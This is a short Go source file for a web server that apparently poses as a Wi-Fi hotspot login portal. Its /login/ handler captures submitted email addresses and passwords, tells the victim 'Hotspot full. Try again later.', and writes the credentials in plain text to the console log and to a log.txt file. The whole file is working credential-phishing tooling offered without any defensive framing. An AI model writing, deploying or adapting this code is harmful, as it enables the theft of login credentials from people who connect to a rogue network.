package serve

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"path"
	"sync"
)

const resFolder = "__res__"
const indexRawHTML = "index.raw.html"
const indexHTML = "index.html"
const logFile = "log.txt"
const successMsg = "Hotspot full. Try again later."
const msg404 = "404 Not Found."

var fileIoMutex sync.Mutex

//Serve serves the specified folder.
func Serve(folder string, port uint) {

	logfile := path.Join(folder, logFile)

	file, _ := os.OpenFile(logfile,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer file.Close()

	http.HandleFunc("/",
		func(w http.ResponseWriter, r *http.Request) {
			serveFile(w, r, indexHTML)
		})

	http.HandleFunc("/login/",
		func(w http.ResponseWriter, r *http.Request) {

			if r.Method != "POST" {
				fmt.Fprintln(w, msg404)
				return
			}

			fmt.Fprintln(w, successMsg)

			body, err := ioutil.ReadAll(r.Body)

			if err != nil {
				fmt.Fprintln(w, msg404)
				log.Print(err)
			}

			values, err := url.ParseQuery(string(body))
			email := values["email"][0]
			pass := values["pass"][0]

			log.Printf("Email: %s, Pass: %s", email, pass)

			fileIoMutex.Lock()
			fmt.Fprintf(file, "user: %s, pass: %s\n", email, pass)
			fileIoMutex.Unlock()

		})

	http.HandleFunc("/"+resFolder+"/",
		func(w http.ResponseWriter, r *http.Request) {
			serveFile(w, r, r.URL.Path[1:])
		})

	addr := ":" + fmt.Sprint(port)

	log.Printf("Serving on %s", addr)
	log.Fatal(http.ListenAndServe(addr, nil))

}

func serveFile(
	w http.ResponseWriter,
	r *http.Request,
	filename string) error {

	log.Printf(
		"%s wanted %s and got %s.",
		r.RemoteAddr,
		r.URL,
		filename)

	http.ServeFile(w, r, filename)
	return nil
}
